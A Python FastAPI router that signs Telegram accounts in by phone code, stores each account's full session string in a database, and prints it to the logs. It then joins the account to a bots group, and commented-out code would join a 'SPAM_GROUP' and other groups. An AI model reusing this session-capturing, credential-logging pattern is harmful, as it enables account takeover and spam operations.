import re
from constants import BOTS_GROUP
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

try:
    from app.constants import ADMIN_GROUP, CHATLIST_LINK, SPAM_GROUP
    from app.db_handler import DbHandler
    from app.services.telegram_bot import TelegramBot
except ImportError:
    from constants import ADMIN_GROUP, CHATLIST_LINK, SPAM_GROUP
    from db_handler import DbHandler
    from services.telegram_bot import TelegramBot

router = APIRouter()
db_handler = DbHandler()
telegram_bot = TelegramBot()


class PhoneNumber(BaseModel):
    phone: str


class VerifyCode(BaseModel):
    phone: str
    code: str
    phone_code_hash: str

@router.post("/send-code/")
async def send_code(phone: PhoneNumber):
    global telegram_bot
    try:
        bot = db_handler.get_by_phone(phone.phone)
        if bot:
            return {"message": "Phone number already exists"}
        telegram_bot = TelegramBot()
        await telegram_bot.connect()
        sign_code = await telegram_bot.send_code(phone.phone)

        return {"message": "code sent","phone_code_hash":sign_code.phone_code_hash}
    
    except Exception as e:
        print(e)
        error_message = str(e)
        pattern = r"A wait of (\d+) seconds"
        match = re.search(pattern, error_message)
        if match:
            seconds = int(match.group(1))
            raise HTTPException(status_code=500, detail={
                "message": f"Error sending code. Try again later after {seconds} seconds",
                "error": error_message
            })
        raise HTTPException(status_code=500, detail={
            "message": "Error sending code. Try again later",
            "error": error_message
        })


@router.post("/verify-code/")
async def verify_code(verify_data: VerifyCode):
    try:
        await telegram_bot.connect()
        await telegram_bot.sign_in(verify_data.phone, verify_data.code,verify_data.phone_code_hash)

        session_string = telegram_bot.connection_manager.save_session_string()
        print("session_string", session_string)
        db_handler.add(session_string, verify_data.phone)
        
        try:
            await telegram_bot.join_group(BOTS_GROUP['link'])
        except Exception as e:
            raise HTTPException(status_code=500, detail={
                "message": "Error joining admin group",
                "error": str(e)
            })
        """
        try:
            await telegram_bot.send_group_message(ADMIN_GROUP.get('title'))
        except Exception as e:
            raise HTTPException(status_code=500, detail={
                "message": "Error sending group message",
                "error": str(e)
            })
        
        try:
            await telegram_bot.join_group(SPAM_GROUP.get('link'))
        except Exception as e:
            raise HTTPException(status_code=500, detail={
                "message": f"Error joining group {SPAM_GROUP.get('title')}",
                "error": str(e)
            })

        try:
            await telegram_bot.join_group(CHATLIST_LINK)
        except Exception as e:
            raise HTTPException(status_code=500, detail={
                "message": "Error joining chat list group",
                "error": str(e)
            })
        """
        return {"message": "code verified"}
    except Exception as e:
        error_message = str(e)
        print(error_message)
        if 'already a participant' in error_message:
            raise HTTPException(status_code=500, detail={
                "message": "code already verified",
                "error": error_message
            })
        raise HTTPException(status_code=500, detail={
            "message": "Error verifying code, try again later",
            "error": error_message
        })

    finally:
        await telegram_bot.disconnect()
